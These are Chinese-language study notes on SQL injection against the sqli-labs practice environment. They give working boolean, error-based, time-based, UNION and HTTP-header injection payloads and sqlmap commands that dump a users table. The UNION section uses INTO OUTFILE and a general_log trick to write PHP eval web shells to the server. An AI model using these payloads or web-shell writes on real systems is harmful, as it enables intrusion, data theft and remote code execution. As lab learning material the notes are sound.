
## 参考资料

[SQLMAP注入检查方法 11种常见SQLMAP使用方法详解](https://www.jb51.net/hack/631963.html)

## 环境

sqli-lab-master
mysql5.7
firefox
hackbar mod by Shariq Malik

mysql的版本调到5.5以上，因为这样你的数据库内才会有information_schema数据库

## mysql基础

	
	#DELETE FROM SeatInformation  
	/*DELETE FROM SeatInformation */
	-- DELETE FROM SeatInformation

admin' or 1=1#


```select name,pass from tbAdmin where name='admin' or 1=1#' and pass='123456' ```


在URL中，如果在最后加上-- ，浏览器在发送请求的时候会把URL末尾的空格舍去，所以我们用--+代替-- ，原因是+在URL被URL编码后会变成空格。

同理

	--空格 等价于 --%20
	 # 要用 %23




## 常见的注入类型

### 按数据类型分类

1.整形（Intiger）

```$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";```

测试步骤：

（1） 加单引号，URL：www.text.com/text.php?id=3’

对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；

（2） 加and 1=1 ,URL：www.text.com/text.php?id=3 and 1=1

对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面无任何差异；

（3） 加and 1=2，URL：www.text.com/text.php?id=3 and 1=2

对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异

如果满足以上三点，则可以判断该URL存在数字型注入。


2.字符型 (String)

```$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";```

当输入的参数为字符串时，称为字符型

**字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。**

例如数字型语句：select * from table where id =3

则字符型如下：select * from table where name=’admin’

测试步骤：

（1） 加单引号：select * from table where name=’admin’’

由于加单引号后变成三个单引号，则无法执行，程序会报错；

（2） 加 ’and 1=1 此时sql 语句为：select * from table where name=’admin’ and 1=1 ,也无法进行注入，还需要通过注释符号将其绕过；

因此，构造语句为：select * from table where name =’admin’ and 1=1--+ 可成功执行返回结果正确；

（3） 加and 1=2-- 此时sql语句为：select * from table where name=’admin’ and 1=2 –-+ 则会报错

如果满足以上三点，可以判断该url为字符型注入。

### 按注入语法分类

1.boolean-based

页面只返回True和False两种类型页面。

	Length（）函数 返回字符串的长度
	Substr（）截取字符串
	Ascii（）返回字符的ascii码
	sleep(n)：将程序挂起一段时间 n为n秒
	if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句

	'and (length(database()))>10 --+
	当前数据库database（）的长度大于10，返回true页面，否则FALSE页面


	

2.error-based

[**报错型sql注入原理分析**](https://blog.51cto.com/wt7315/1891458)

使用能触发SQL报错机制的注入语句

三种报错注入常用的语句：

(1). 通过floor报错

	and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a)
其中payload为你要插入的SQL语句

需要注意的是该语句将 输出字符长度限制为64个字符

	页面会报错：Duplicate entry '数据库名1' for key 'group_key'

**floor函数返回小于等于该值的最大整数**

(2). 通过updatexml报错

	and updatexml(1,payload,1)
同样该语句对输出的字符长度也做了限制，其最长输出32位

并且该语句对payload的返回类型也做了限制，只有在payload返回的不是xml格式才会生效

	1',1,updatexml(1,concat(0x3a,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x3a),1))#

	1',1,updatexml(1,concat(0x3a,(select database()),0x3a),1))#

(3). 通过ExtractValue报错

	and extractvalue(1, payload)

	and (extractvalue(1, concat(0x5c,(select user()))))
输出字符有长度限制，最长32位。

payload即我们要输入的sql查询语句




3.time-based

当无论输入什么页面都回显一样，就要考虑时间盲注了，最常见的 ``` ' and sleep(5)```

一些网站会简单过滤  ```and && or || ```,这时要借助 ```if```

如果 if 被过滤，可以使用 ```case when(payload) then sleep(5) else sleep(2) end```

```substr``` 可以精确获取一个字符，进行猜测，但前提，这个字符要在你的爆破字典里。

例如我的字典，字母数字下划线: ```sqcwertyuioplkjhgfdazxvbnm_1234567890```

如果包含其他字符，就获取不到了，这时我的程序可能就停止了。

**创建一个含有特殊字符的数据库**  ```mysql> CREATE DATABASE `!@#$%^&*()_`;```

ascii 是判断当前字符的 ascii 值与数字比较，从而虽然不知道字符具体是什么，但可以不断逼近，可以用二分法，考虑效率的话这里就涉及到一些算法了，但是不需要那么复杂，慢慢爆破就好了。


	' and (if(ascii(substr(database(),1,1))>114,sleep(10),sleep(4))  --+ 
	if（）和sleep（）联合逐个猜解数据

	如果当前查询的当前数据库ascii(substr(database(),1,1))的第一个字符的ASCII码大于100，ture 沉睡10秒，FALSE 沉睡4秒
	
	利用二分法，115为fal，114TRUE，数据库第一个字符ASCII为115，即s
	
	同理修改substr(database(),2,1)可猜第二个字符，之后同理，当然在猜数据库字符前也可先猜数据库长度：length（database()）
	
	查表(查询出数据库的第一个数据表的首字母，最后查询出数据表的名字)
	' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))>100#

	```WAITFOR DELAY '0:0:4```表示延迟4秒，只是用与sql server

4.UNION query

	
	Dump into Outfile (高权限注入遇到secure_file_priv):
	into outfile / into dumpfile写文件:
	union select 1,"<?php @eval($_POST['chopper']);?>",3 into outfile "C:\\phpStudy\\PHPTutorial\\WWW\\123456.php" --+
	
	ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement

	在mysql查看secure_file_priv
	show global variables like '%secure%';
	在mysql高版本的配置文件中默认没有secure_file_priv这个选项，但是你用SQL语句来查看secure_file_priv发现，没配置这个选项就是NULL，也就是说无法导出文件。

	替代方法：
	set global general_log=on;set global general_log_file='C:/phpStudy/WWW/123.php';select '<?php eval($_POST[123]) ?>';
	php的 mysql_query 只支持单语句。所以这个利用点不大。

[sql注入--高权限，load_file读写文件](https://www.cnblogs.com/hackxf/p/8975501.html)

5.多语句查询注入

联合查询限制条件：必须由两条或两条以上的select语句组成，语句之间用关键字union分隔 ,union中的每个查询必须包含相同的列


延时注入和布尔注入共同点：都是一个字符一个字符爆出来的，耗费时间长，都没有显示位，都要ASCII码推算

报错注入：由于配置不当，错误信息被输出到前台，导致攻击者根据报错信息进行一系列操作



## 漏洞sql格式
	
	整形
	$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
	字符型
	$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
	字符型 '）闭合
	$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
	字符型 "）闭合
	$id = '"' . $id . '"';
	$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
	字符型 ')) 闭合
	$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";


还有一些是包头注入（Header Injection）,过滤了用户名密码没有过滤包头，比如

	$uagent = $_SERVER['HTTP_USER_AGENT'];

	$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";

	',1,updatexml(1,concat(0x5c,(select database()),0x5c),1))#

	INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('',1,updatexml(1,concat(0x5c,(select database()),0x5c),1))#', 'XXX.XXX.178.167', 'admin')

	注意保证字段数与要插入的列数一致
	
常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】


	$insert="INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";

	',updatexml(1,concat(0x5c,(select database()),0x5c),1))#

	$cookee = $_COOKIE['uname'];

	$sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"

	

## 步骤

1.判断注入类型

2.判断是否有显示位

将id=1改为一个数据库不存在的id值，如861，使用union select 1,2,3联合查询语句查看页面是否有显示位，如果发现页面先输出了2和3，说明页面有2个显示位，如果没有输出，说明页面没有显示位。无法使用联合查询注入。

有显示位:联合查询

无显示位:报错注入



## sqlmap 一些语法
	
### post注入检测
	
	自动检测forms：
	
	sqlmap -u "http://ip/sqli-labs-master/Less-11/" --forms
	
	指定参数检测：
	
	sqlmap -u "http://ip/sqli-labs-master/Less-11/"  --data "uname=1&passwd=1"
	
	检测 uname 参数是否存在注入：

	sqlmap -u "http://ip/sqli-labs-master/Less-11/" --method POST --data "uname=1&passwd=1" -p uname

#### sqlmap 查看权限

	sqlmap -u url --privileges

#### post注入爆破

	抓包，保存登陆的post请求响应，存储为sql.txt，爆破数据库名：

	sqlmap -r sql.txt --dbs
		
	根据猜解的数据库猜解表：	
	
	 sqlmap -r --tables -D security
	
	根据猜解的表进行猜解表的column

	 sqlmap -r --columns -D security -T users 

	根据字段猜解内容 （--dump会下载到本地）
	
	 sqlmap -r --dump -D security -T users -C "username,password"




## 后记

sql shell 和php的mysql库函数是不同的，mysql_query 是不支持多语句的。

可以打开数据库sql执行日志，然后看slow query日志

sqlmap跑不出来需要手工注入的情况？